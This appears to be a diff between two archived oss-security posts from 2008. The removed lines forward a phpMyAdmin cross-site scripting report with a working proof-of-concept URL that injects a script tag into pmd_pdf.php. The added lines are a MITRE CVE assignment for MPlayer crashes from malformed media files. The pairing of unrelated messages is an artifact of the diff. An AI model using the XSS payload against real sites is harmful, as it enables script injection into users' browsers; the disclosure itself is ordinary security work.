@@ -1,68 +1,53 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2008/10/27/5
-Message-Id: <200810280029.00376.hanno@hboeck.de>
-Date: Tue, 28 Oct 2008 00:28:59 +0200
-From: Hanno Böck <hanno@...eck.de>
-To: oss-security@...ts.openwall.com
-Cc: coley@...re.org
-Subject: CVE request phpmyadmin (Fwd: XSS in phpMyadmin)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2008/10/20/3
+Message-ID: <Pine.GSO.4.51.0810201236430.28212@faron.mitre.org>
+Date: Mon, 20 Oct 2008 12:37:56 -0400 (EDT)
+From: "Steven M. Christey" <coley@...us.mitre.org>
+To: oss-security <oss-security@...ts.openwall.com>
+cc: "Steven M. Christey" <coley@...us.mitre.org>
+Subject: Re: CVE request: crashers / potential security risks in mplayer
 Content-Type: text/plain; charset=utf-8
 
-No fix yet, works also in 3.0.1.
 
-----------  Weitergeleitete Nachricht  ----------
+Note, some of this stuff is hard to sift through because of such a large
+number of crashers.  We're taking a relatively conservative approach here.
 
-Subject: XSS in phpMyadmin
-Date: Montag 27 Oktober 2008
-From: hadikiamarsi@...mail.com
-To: bugtraq@...urityfocus.com
+The 2007 CVE number is for issues that were technically released in 2007.
 
-Author : Hadi Kiamarsi
+- Steve
 
--------------------------------------------
+======================================================
+Name: CVE-2007-6718
+Status: Candidate
+URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6718
+Reference: MLIST:[oss-security] 20081007 CVE request: crashers / potential security risks in mplayer
+Reference: URL:http://www.openwall.com/lists/oss-security/2008/10/07/1
+Reference: MISC:http://sam.zoy.org/blog/2007-01-16-exposing-file-parsing-vulnerabilities
 
-Discovered by : Hadi Kiamarsi
+MPlayer, possibly 1.0rc1, allows remote attackers to cause a denial of
+service (SIGSEGV and application crash) via (1) a malformed MP3 file,
+as demonstrated by lol-mplayer.mp3; (2) a malformed Ogg Vorbis file,
+as demonstrated by lol-mplayer.ogg; (3) a malformed MPEG-1 file, as
+demonstrated by lol-mplayer.mpg; (4) a malformed MPEG-2 file, as
+demonstrated by lol-mplayer.m2v; (5) a malformed MPEG-4 AVI file, as
+demonstrated by lol-mplayer.avi; (6) a malformed FLAC file, as
+demonstrated by lol-mplayer.flac; (7) a malformed Ogg Theora file, as
+demonstrated by lol-mplayer.ogm; (8) a malformed WMV file, as
+demonstrated by lol-mplayer.wmv; or (9) a malformed AAC file, as
+demonstrated by lol-mplayer.aac.  NOTE: vector 5 might overlap
+CVE-2007-4938, and vector 6 might overlap CVE-2008-0486.
 
--------------------------------------------
 
-Exploited By : Hadi Kiamarsi
+======================================================
+Name: CVE-2008-4610
+Status: Candidate
+URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4610
+Reference: MLIST:[oss-security] 20081007 CVE request: crashers / potential security risks in mplayer
+Reference: URL:http://www.openwall.com/lists/oss-security/2008/10/07/1
 
--------------------------------------------
+MPlayer allows remote attackers to cause a denial of service
+(application crash) via (1) a malformed AAC file, as demonstrated by
+lol-vlc.aac; or (2) a malformed Ogg Media (OGM) file, as demonstrated
+by lol-ffplay.ogm, different vectors than CVE-2007-6718.
 
-E-Mail : hadikiamarsi[at]hotmail.com
 
--------------------------------------------
-
-web site : www.ircrash.com
-
--------------------------------------------
-
-members team : Hadi Kiamarsi - khashayar fereidani - sina yazdanmehr
-
--------------------------------------------
-
-Sript Name : phpmyadmin ( All version )
-
-Download Script : 
-http://prdownloads.sourceforge.net/phpmyadmin/phpMyAdmin-3.0.0-all-languages.zip?download
-
--------------------------------------------
-
-XSS
-
-Exploit :
-
-register_globals=on
-
-query : 
-http://[www.example.com]/pmd_pdf.php?db=>"><script>alert('Hadi-Kiamarsi')</script>
-
--------------------------------------------------------
-
--- 
-Hanno Böck		Blog:		http://www.hboeck.de/
-GPG: 3DBD3B20		Jabber/Mail:	hanno@...eck.de
-
-http://x1000malquer.de/ - ab 8.11. Atomtransporte stoppen
-
-Download attachment "signature.asc " of type "application/pgp-signature" (198 bytes)
